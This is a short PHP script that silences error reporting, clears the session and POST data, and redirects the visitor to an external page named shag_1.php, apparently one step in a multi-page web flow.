<?php error_reporting(0);
session_start();

session_unset();
unset($_POST);

header("Location: http://meta.afoteris.com/shag_1.php");
?>